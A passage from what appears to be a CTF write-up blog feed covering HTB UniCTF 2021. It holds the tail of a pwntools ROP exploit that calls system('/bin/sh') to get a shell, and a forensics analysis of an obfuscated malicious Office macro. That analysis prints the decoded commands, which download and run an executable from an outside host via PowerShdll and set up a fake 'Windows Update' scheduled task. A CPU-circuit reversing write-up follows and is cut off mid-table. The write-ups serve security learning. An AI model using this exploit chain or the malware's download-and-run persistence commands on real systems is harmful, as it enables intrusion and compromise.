&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc:&amp;#39;&lt;/span&gt;, hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(libc)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bin_sh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pop_rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401184&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(pop_rdi)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(bin_sh)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(ret)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(system)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;spell &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic_mark &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gen_payload(spell)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;send_payload(io, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Just launch it and enjoy the flag !&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/sacred_scrolls_getflag.png&#34; alt=&#34;getflag&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>New Era - [HTB UNICTF 2021 - Finals]</title>
      <link>https://alagroy-42.github.io/writeups/new_era/</link>
      <pubDate>Tue, 14 Jun 2022 18:39:26 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/new_era/</guid>
      <description>The Challenge For this challenge we had an ISO file that contains this Office document.
We are gonna use the oletool suite to try to see if there is anything suspicious in that file.
The oledump utility shows us that there are macros that appear suspicious. We are gonna use the olevba utility to get more infos on the macros
That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge we had an ISO file that contains &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/office.doc&#34;&gt;this Office document&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We are gonna use the &lt;code&gt;oletool&lt;/code&gt; suite to try to see if there is anything suspicious in that file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_oledump.png&#34; alt=&#34;oledump&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;oledump&lt;/code&gt; utility shows us that there are macros that appear suspicious.
We are gonna use the &lt;code&gt;olevba&lt;/code&gt; utility to get more infos on the macros&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_olevba.png&#34; alt=&#34;olevba&#34;&gt;&lt;/p&gt;
&lt;p&gt;That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code. The problem is that it&amp;rsquo;s been compiled into assembly so we don&amp;rsquo;t have a direct access to the VBA. We are gonna use a utility called &lt;code&gt;pcode2code&lt;/code&gt; to transform back the pcode into human-readable VBA which gives us &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/raw_macro.vba&#34;&gt;this file&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Good news is that this is human readable-code, bad news is that it is completely obfuscated. So our main task will be to deobfuscate it.
We can notice a lot of code chunks using the &lt;code&gt;Chr&lt;/code&gt; function that converts a number to a char so we can guess that those are hidden strings. By simply copying those in a python file and renaming &lt;code&gt;Chr&lt;/code&gt; to &lt;code&gt;chr&lt;/code&gt; plus a few minor modifications, we can retrieve them and replace them in the original code.
For example :
&lt;code&gt;td.RegistrationInfo.Author = SazX46jj(&amp;quot;m&amp;quot; &amp;amp; Chr(int(&amp;quot;&amp;amp;H4f&amp;quot;)) &amp;amp; Chr(-878 + 958) &amp;amp; Chr(&amp;amp;H32) &amp;amp; &amp;quot;U&amp;quot; &amp;amp; Chr(75) &amp;amp; Chr(-2899 + 3012) &amp;amp; Chr(int(&amp;quot;55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;47&amp;quot;)) &amp;amp; Chr(2158 - 2109) &amp;amp; Chr(int(&amp;quot;&amp;amp;H52&amp;quot;)) &amp;amp; Chr(1501 - 1390) &amp;amp; Chr(int(&amp;quot;112&amp;quot;)) &amp;amp; Chr(476 - 360) &amp;amp; Chr(-1634 + 1716) &amp;amp; Chr(int(&amp;quot;71&amp;quot;)) &amp;amp; Chr(113) &amp;amp; Chr(&amp;amp;H76) &amp;amp; Chr(int(&amp;quot;106&amp;quot;)) &amp;amp; Chr(99) &amp;amp; Chr(int(&amp;quot;&amp;amp;H55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H75&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H43&amp;quot;)) &amp;amp; Chr(&amp;amp;H30) &amp;amp; Chr(47) &amp;amp; Chr(int(&amp;quot;&amp;amp;H46&amp;quot;)) &amp;amp; Chr(88) &amp;amp; Chr(8301 - 8247) &amp;amp; Chr(&amp;amp;H2B) &amp;amp; Chr(int(&amp;quot;108&amp;quot;)) &amp;amp; &amp;quot;9&amp;quot; &amp;amp; Chr(&amp;amp;H64))&lt;/code&gt;
will now be :
&lt;code&gt;td.RegistrationInfo.Author = deobf_str(&amp;quot;mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Every encoded string seems to be another base64 string but they also don&amp;rsquo;t decode into anything readable. However, we can notice that each of the base64-like strings are given to the same function that we will name &lt;code&gt;deobf_str&lt;/code&gt;. That gives us the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_1.vba&#34;&gt;stage_1&lt;/a&gt; file that is partially decoded.
After trying to understand how the script works, we got the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_2.vba&#34;&gt;stage_2&lt;/a&gt; file that has its symbols renamed with a coherent name and also more coherent types.&lt;/p&gt;
&lt;p&gt;Now that we have an approximation of what the &lt;code&gt;deobf_str&lt;/code&gt; function does, we will recode it in Python and try to get see what is hidden in the Base64-like strings.
Here is the corresponding script :&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;deobfuscate.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from curses.ascii import isdigit, islower, isupper
import sys

def binary_transform1(elem, op):
    out = elem
    if op &amp;gt; 0:
        if elem &amp;gt; 0:
            out = int(out / (2 ** op))
        else:
            if op &amp;gt; 31:
                out = 0
            else:
                out = out &amp;amp; 0x7FFFFFFF
                out = int(out / (2 ** op))
                out = out | (2 ** (31 - op))
    return out

def binary_transform2(elem, op):
    out = elem
    if op &amp;gt; 0:
        for i in range(op):
            m = out &amp;amp; 0x40000000
            out = (out &amp;amp; 0x3FFFFFFF) * 2
            if m != 0:
                out = out | 0x80000000
    return out

def binary_transform3(setup):
    d1 = 7
    d2 = 14
    t = ((setup ^ binary_transform1(setup, d2)) &amp;amp; 52428)
    u = setup ^ t ^ binary_transform2(t, d2)
    t = (u ^ binary_transform1(u, d1)) &amp;amp; 5570645
    out = (u ^ t ^ binary_transform2(t, d1))
    return out

def crypto_style_mega_binary_transform(pre_final_result):
    return_value = &amp;#34;&amp;#34;
    for i in range(len(pre_final_result)):
        fr = i * 4
        if fr &amp;#43; 3&amp;gt;= len(pre_final_result):
            break
        setup = 0
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 3], 24)
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 2], 16)
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 1], 8)
        setup |= pre_final_result[fr]
        raw = binary_transform3(setup)
        a = chr(binary_transform1(raw &amp;amp; 0xff000000, 24))
        B = chr(binary_transform1(raw &amp;amp; 16711680, 16))
        c = chr(binary_transform1(raw &amp;amp; 65280, 8))
        d = chr(binary_transform1(raw &amp;amp; 255, 0))
        return_value = return_value &amp;#43; d &amp;#43; c &amp;#43; B &amp;#43; a
    return return_value



matrix = [0] * 256
arr1 = [0] * 64
arr2 = [0] * 64
arr3 = [0] * 64

for i in range (256):
    if isupper(i):
        matrix[i] = i - 65
    elif islower(i):
        matrix[i] = i - 71
    elif isdigit(i):
        matrix[i] = i &amp;#43; 4
    elif i == ord(&amp;#34;&amp;#43;&amp;#34;):
        matrix[i] = ord(&amp;#34;&amp;gt;&amp;#34;)
    elif i == ord(&amp;#34;/&amp;#34;):
        matrix[i] = ord(&amp;#34;?&amp;#34;)

for i in range(64):
    arr1[i] = i * 64
    arr2[i] = i * 64 * 64
    arr3[i] = i * 64 * 64 * 64

arg_str = sys.argv[1]
pre_final_result = [0] * (int((len(arg_str) &amp;#43; 1) / 4) * 3)
index_pre_final_result = 0

arg_str_array = [ord(i) for i in arg_str]

for iter in range(0, len(arg_str_array), 4):
    mega_byte = arr3[matrix[arg_str_array[iter]]] &amp;#43; arr2[matrix[arg_str_array[iter &amp;#43; 1]]] &amp;#43; arr1[matrix[arg_str_array[iter &amp;#43; 2]]] &amp;#43; matrix[arg_str_array[iter &amp;#43; 3]]
    i = mega_byte &amp;amp; 0xff0000
    pre_final_result[index_pre_final_result] = int(i / 0x10000)
    i = mega_byte &amp;amp; 0xff00
    pre_final_result[index_pre_final_result &amp;#43; 1] = int(i / 0x100)
    pre_final_result[index_pre_final_result &amp;#43; 2] = mega_byte &amp;amp; 0xff
    index_pre_final_result &amp;#43;= 3

deobf_str = crypto_style_mega_binary_transform(pre_final_result).strip(&amp;#34;~&amp;#34;)
print(deobf_str)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We will give each string to that script and try to see what they are corresponding to :&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;strs.sh&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
/usr/local/bin/python3 deobfuscate.py &amp;#34;oPhSWfo8/Qbyq3BYqC59Urpr&amp;#43;lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho&amp;#43;1GqWpxDsK7wUappuFOi&amp;#43;/dR0qhwVvCqU0U=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy&amp;#43;Ndkq9YVPjYXV0=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK&amp;#43;AjSNlJT&amp;#43;HL8XA==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;gqV5VqC/WFWi28dQuqfQVg==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;mOP2UKq7/1RoptRGqvjcUuC0/FX6&amp;#43;l9d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04&amp;#43;lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY&amp;#43;FdSAPzfRsjr51nyJHFZ&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;qlBUCugWcgwi2FUKulBVCupQV04=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;uK/UVug&amp;#43;OVDY&amp;#43;l1d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;mqt4Vqqz8xmAvnBS6OtcXw==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ&amp;#43;vh9Xw==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;ivPlUuC4dhzSqPBW&amp;#43;PpfXQ==&amp;#34;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  forensics_newera sh strs
https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dl
C:\Windows\System32\rundll32.exe 
\powershdll.dll,main . { Invoke-WebRequest -useb https://windowsliveupdater.com/install.exe -OutFile 
C:\ProgramData\windows\install.exe
; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
Schedule.Service
Microsoft Corporation
cGFydDIgPSAiYnV0X3AwdzNyc2gzbGxfdzF0aDB1dF9wMHczcnNoM2xsXzFzX2MwMGwzcn0i
2022-02-22T22:22:22
tigger.ID
C:\ProgramData\windows\install.exe
Windows Update
winmgmts:\\.\root\cimv2
winmgmts:\\.\root\cimv2
winmgmts:\\.\root\cimv2:Win32_Process
WScript.Shell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That definetly looks like a shady macro and there is a particularly peculiar string in those which is&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once decoded, the base64 string gives us &lt;code&gt;part1 = &amp;quot;HTB{sch3dul1ng_t4sks_1s_c00l_&amp;quot;&lt;/code&gt;. We guess that the second part is in the other base64 string which gives us, once decoded : &lt;code&gt;part2 = &amp;quot;but_p0w3rsh3ll_w1th0ut_p0w3rsh3ll_1s_c00l3r}&amp;quot;&lt;/code&gt;. We now have the full flag.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Mechanical Madness - [HTB UNICTF 2021 - Qualifiers]</title>
      <link>https://alagroy-42.github.io/writeups/mechanical_madness/</link>
      <pubDate>Tue, 14 Jun 2022 15:42:52 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/mechanical_madness/</guid>
      <description>The Challenge For this challenge we had the following files :
cpu.circ (A very big XML file that describe the processor) nasm program.asm v2.0 raw 10000a 100101 10100 130000 100101 e0000 40000 nasm program.asm :start movl ax, 10 :sub1 movl bx, 1 sub bx cmp ax, ax movl bx, :sub1 jnz rst nasm program.asm :start movl cx, 10 clr movl bx, 1 movl dx, 0 mmiv 0x0, dx movl bx, :sub4 call bx, 0 mmov ax, 0x0 movl bx, :sub5 call bx, 0 :sub1 movl bx, 1 movl dx, 0 push dx, 0 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub1 jnz movl bx, :sub4 call bx, 0 :sub2 movl bx, 0 mmiv 0x1, bx mmiv 0x2, bx :sub3 pop ax, 0 movl bx, 1 movl dx, 0 movl bx, :sub5 call bx, 0 mmov bx, 0x1 msk mmiv 0x1, bx mmov bx, 0x2 mskb mmiv 0x2, bx movl ax, 0xff cmp bx, ax movl bx, :sub3 jl movl bx, 0 mmov dx, 0x1 movl cx, 1 movl cx, 0 movl bx, :sub2 jmp bx, 0 :sub4 movl ax, 0x05 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub4&amp;#43;1 jnz ret :sub5 movl cx, 4 movl cx, 0 ret Processor Analysis Once we open the cpu.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge we had the following files :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/writeups/mechanical_madness/cpu.circ.xml&#34;&gt;cpu.circ&lt;/a&gt; (A very big XML file that describe the processor)



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
v2.0 raw
10000a 100101 10100 130000 100101 e0000 40000 
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
:start
	movl ax, 10
:sub1
	movl bx, 1
	sub  bx
	cmp  ax,  ax
	movl bx,  :sub1
	jnz
	rst
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
:start
	movl cx, 10
	clr
	movl bx,  1
	movl dx,  0
	mmiv 0x0,  dx
	movl bx,  :sub4
	call bx,  0
	mmov ax, 0x0
	movl bx,  :sub5
	call bx,  0
:sub1
	movl bx,  1
	movl dx,  0
	push dx,  0
	movl bx,  :sub5
	call bx,  0
	movl bx,  1
	sub  bx,  0
	cmp  ax, ax
	movl bx, :sub1
	jnz
	movl bx,  :sub4
	call bx,  0
:sub2
	movl bx,  0
	mmiv 0x1, bx
	mmiv 0x2, bx
:sub3
	pop  ax,  0
	movl bx,  1
	movl dx,  0
	movl bx,  :sub5
	call bx,  0
	mmov bx, 0x1
	msk
	mmiv 0x1, bx
	mmov bx, 0x2
	mskb
	mmiv 0x2, bx
	movl ax,  0xff
	cmp  bx, ax
	movl bx, :sub3
	jl
	movl bx,  0
	mmov dx, 0x1
	movl cx,  1
	movl cx,  0
	movl bx,  :sub2
	jmp  bx,  0
:sub4
	movl ax,  0x05
	movl bx,  :sub5
	call bx,  0
	movl bx,  1
	sub  bx,  0
	cmp  ax,  ax
	movl bx,  :sub4&amp;#43;1
	jnz
	ret
:sub5
	movl cx,  4
	movl cx,  0
	ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;processor-analysis&#34;&gt;Processor Analysis&lt;/h2&gt;
&lt;p&gt;Once we open the &lt;code&gt;cpu.circ&lt;/code&gt; in logisim as stated, we can see that we have a whole processor that shows up :
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cpu.png&#34; alt=&#34;processor&#34;&gt;&lt;/p&gt;
&lt;p&gt;This processor is an electronic circuit powered by a clock. The first interesting part of the circuit are :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_clock.png&#34; alt=&#34;Clock&#34;&gt;
Fig 1. Clock Cycle
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_RAM.png&#34; alt=&#34;RAM&#34;&gt;
Fig 2. RAM and instruction loading&lt;/p&gt;
&lt;p&gt;On &lt;code&gt;Fig 1&lt;/code&gt;, we can see that the clock system is gonna cycle on 5 wires. The two first ones are the one coming from the top on &lt;code&gt;Fig 2&lt;/code&gt;. The first wire is gonna power the &lt;code&gt;WR&lt;/code&gt; register and the last four are respectively named Decode, Execute, Store and Clear. We can see on &lt;code&gt;Fig 2&lt;/code&gt; that a typical cycle will load the content of the current element (3 bytes) of the RAM in the &lt;code&gt;WR&lt;/code&gt; register and then split its three bytes in 3 different registers : &lt;code&gt;IR&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;. Those bytes are then used by the CU module which probably stands for Control Unit :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cu.png&#34; alt=&#34;CU&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the Control Unit, we can see that there are a lot of blocks on the left side carrying the instructions name, we can guess that it is in those blocks that the instructions are executed. Those blocks are (almost) all directly plugged to &lt;code&gt;IR&lt;/code&gt; and when going inside the blocks we can see that they are also plugged to either &lt;code&gt;RA&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;, or none. We can assume that &lt;code&gt;IR&lt;/code&gt; is gonna be the Instruction Register, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt; are gonna contain respectively the first and second operand of the instructions. Except for some special cases (&lt;code&gt;mov&lt;/code&gt;, &lt;code&gt;movl&lt;/code&gt;, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;), every instruction contains a AND logic gate plugged on each of the five last bits of &lt;code&gt;IR&lt;/code&gt; where some of the bits are being NOT.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_gate.png&#34; alt=&#34;gate&#34;&gt;
Fig 3. CMP instruction logic gate&lt;/p&gt;
&lt;p&gt;Here we can see that &lt;code&gt;cmp&lt;/code&gt; is switched on by the &lt;code&gt;10011&lt;/code&gt; sequence (0x13), we can see that all these gates are unique so we can use them to retrieve the opcodes of all the instructions which gives us the following translation table :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Opcode&lt;/th&gt;
&lt;th&gt;Instruction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;add&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1&lt;/td&gt;
&lt;td&gt;sub&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x2&lt;/td&gt;
&lt;td&gt;mul&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3&lt;/td&gt;
&lt;td&gt;clr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x4&lt;/td&gt;
&lt;td&gt;rst&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x5&lt;/td&gt;
&lt;td&gt;jmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x6&lt;/td&gt;
&lt;td&gt;ljmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x7&lt;/td&gt;
&lt;td&gt;jlp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x8&lt;/td&gt;
&lt;td&gt;jg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x9&lt;/td&gt;
&lt;td&gt;jge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xa&lt;/td&gt;
&lt;td&gt;jl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xb&lt;/td&gt;
&lt;td&gt;jle&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xc&lt;/td&gt;
&lt;td&gt;je&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xd&lt;/td&gt;
&lt;td&gt;jz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xe&lt;/td&gt;
&lt;td&gt;jnz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xf&lt;/td&gt;
&lt;td&gt;div&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;movl*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
